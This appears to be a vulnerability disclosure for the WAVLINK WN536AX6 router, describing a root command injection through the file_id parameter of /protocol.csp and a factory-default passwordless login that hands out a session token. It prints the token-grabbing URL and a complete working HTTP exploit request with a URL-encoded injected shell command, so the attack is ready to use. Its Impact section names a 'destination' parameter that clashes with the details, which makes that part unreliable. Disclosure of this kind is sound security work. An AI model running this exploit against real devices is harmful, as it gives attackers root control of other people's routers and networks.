# WAVLINK WN536AX6



- Vendor: WAVLINK
- Product: WN536AX6
- Firmware Version: V260507
- Vulnerability Type:Authenticated Command Injection

# Description

​		The authenticated command injection vulnerability in the openvpn_cli handler of /protocol.csp on the WAVLINK
  WN536AX6-A router (firmware OpenWrt 21.02 / MT7986 / aarch64) can be exploited through the controllable file_id
  parameter, leading to remote code execution with root privileges. Although a valid session token is required,
  authentication is trivially bypassable: the device ships with FirstLogin=1 (passwordless login enabled by default),
  allowing an attacker to obtain a valid token with a single unauthenticated login request.

#   Impact

An authenticated attacker can inject arbitrary shell commands through the `destination` parameter and execute them with the privileges of the web service, potentially resulting in full compromise of the device.

#   Vulnerability Details

In the ioos web backend, within the openvpn_cli handler of /protocol.csp (fname=net&opt=openvpn_cli&function=set), the request parameter file_id is not sanitized before being directly concatenated into the shell command uci show ovpnclient | grep "file_id='%s'", which is then executed via popen(). Under the device's factory default configuration (FirstLogin=1, which enables passwordless authentication), an attacker needs only two steps to obtain a root shell: first, send a request to fname=system&opt=login&function=set&usrid= to retrieve a session token; then, with the token, access the injection payload file_id=aa" | <arbitrary command> #, which triggers the execution of arbitrary commands with root privileges.

<img width="1045" height="529" alt="图片" src="https://github.com/user-attachments/assets/f16a4f77-448d-47ff-bddb-9f2129803702" />


<img width="1150" height="123" alt="图片" src="https://github.com/user-attachments/assets/938580ca-d9b0-4b8a-9fa1-2c0dded685fe" />




A token is required. In factory default settings, it can be obtained without a password by simply accessing the following URL.

http://192.168.10.3/protocol.csp?fname=system&opt=login&function=set&usrid=

<img width="1313" height="179" alt="图片" src="https://github.com/user-attachments/assets/9a22e1e7-b5a6-431f-b021-d42bca82ed79" />


Obtain the token, then perform the exploit.

**exp**

```http
GET /protocol.csp?token=6D0D271C517B048677808FAA36778F25&fname=net&opt=openvpn_cli&function=set&ovpn_enable=1&sel_pwd_val=0&usr_name=x&usr_passwd=x&file_id=aa%22%20%7C%20touch%20%2Fget_shell%20%23 HTTP/1.1

Host: 192.168.10.2

Cookie: i18next=en_US

Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"

Accept: application/json, text/javascript, */*; q=0.01

X-Requested-With: XMLHttpRequest

Sec-Ch-Ua-Mobile: ?0

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36

Sec-Ch-Ua-Platform: "Linux"

Sec-Fetch-Site: same-origin

Sec-Fetch-Mode: cors

Sec-Fetch-Dest: empty

Referer: https://192.168.10.2/

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Priority: u=1, i

Connection: close




```

Reproduction Results
<img width="1176" height="179" alt="图片" src="https://github.com/user-attachments/assets/9a2e96bf-b26a-47af-a072-1b55d475009f" />




<img width="1257" height="487" alt="图片" src="https://github.com/user-attachments/assets/cc69f796-863b-4589-a32c-04c19f80e2c4" />

<img width="1528" height="593" alt="图片" src="https://github.com/user-attachments/assets/8fd859db-c568-4a89-82ab-ff1603c32df4" />
